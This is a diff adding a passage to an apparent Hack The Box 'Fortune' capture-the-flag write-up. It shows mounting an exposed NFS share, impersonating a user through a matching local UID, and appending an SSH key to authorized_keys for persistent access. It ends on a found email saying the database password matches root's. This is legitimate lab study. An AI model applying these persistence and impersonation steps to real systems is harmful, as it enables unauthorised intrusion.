@@ -266,6 +266,74 @@ I ended up managing to mount `/home` locally by running the `mount` command like
 ```
 mount -t nfs 10.10.10.127:/home /temp -o nolock
 ```
+I already had the empty `/temp` directory created beforehand. Once the share is mounted, we can check to see what is there:
+
+```
++[root@kali: temp]$ ls -al
+total 40
+drwxr-xr-x  5 root  root      512 Nov  2  2018 .
+drwxr-xr-x 21 root  root    32768 Sep 17 17:15 ..
+drwxr-xr-x  5  1001 charlie   512 Nov  3  2018 bob
+drwxr-x---  3 farbs farbs     512 Nov  5  2018 charlie
+drwxr-xr-x  2  1002    1002   512 Nov  2  2018 nfsuser
+```
+Cool, all of the directories are outputted. I have created a local user named `farbs` which shares the same UID as `charlie`. Therefore, I can simply enter `su farbs` and access the `charlie` directory since the permissions already match.
+
+```
++[root@kali: temp]$ su farbs
+farbs@kali:/temp$ cd charlie
+farbs@kali:/temp/charlie$ wc -c user.txt
+33 user.txt
+```
+And... we got `user.txt`!
+
+From here, I went ahead and generated my own ssh keypair and then added my public key to `charlie's` `authorized_keys` file so I could ssh in as `charlie`. 
+
+Once I had my ssh keypair generated, I added it to the `authorized_keys` file:
+
+```
+farbs@kali:/temp/charlie/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgGP15cHMY8+Mg8aUg5mml5t6jxpY43paksKO84vhdJdaKFQnryShQI2GbzpbNkV0ICl1yJnKdN0DfnLOXcAkt6YLSvOR7tModGaP/0XOCGBWneO7/U4HMnuEX4VcfHoR+AoCjmCNx8diQvO/yytLDmEJic4yYEUz8m2nA7l14AE6t+YtaJO5tzvJ6CSHaOGVrZiGqCGq2tkE9kN5o+Wg77P3Z8Vq72tOsitQ+hUSloLkMFVUKZWQSGsY1s/3G/b6eT4ZyetVU3Nggv+QYAbWfMDbj+imeREz7Z7T/bxy1tjENq1NSrB/5bZlmAuP/KyKDwI3sktNbhi80q+YRE9ELIA44taj+SjKZ6tZZjQUJIxLt7mZteiw7XgLaVveG+YB9WV1ymxt2wfkQ3Ht6cjl+9JYxoHXIdfBmAivh3goFIOFdxxLRt3RAq/DqlQY4/t3WltAu3LCtBTs8746OMh/vEJFyNOtlPiAXV2f3pGPAYsq4hjYLiV6MDNDvD4+lZKs= >> authorized_keys
+```
+
+I then unmounted the share and SSH'd in as `charlie`:
+
+```
++[root@kali: writeup_ssh]$ ssh -i id_rsa charlie@10.10.10.127
+OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+fortune$ whoami
+charlie
+```
+
+Now that we're in, it's time to do some more enumeration! I notice an `mbox` file sitting in `charlie's` home directory, so I take a look at it. It reads the following:
+
+```
+From bob@fortune.htb Sat Nov  3 11:18:51 2018
+Return-Path: <bob@fortune.htb>
+Delivered-To: charlie@fortune.htb
+Received: from localhost (fortune.htb [local])
+        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
+        for <charlie@fortune.htb>;
+        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+From:  <bob@fortune.htb>
+Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+To: charlie@fortune.htb
+Subject: pgadmin4
+Message-ID: <196699abe1fed384@fortune.htb>
+Status: RO
+
+Hi Charlie,
+
+Thanks for setting-up pgadmin4 for me. Seems to work great so far.
+BTW: I set the dba password to the same as root. I hope you don't mind.
+
+Cheers,
+
+Bob
+```
+
+
 
 ## Writeup In Progress... Stay tuned!
 
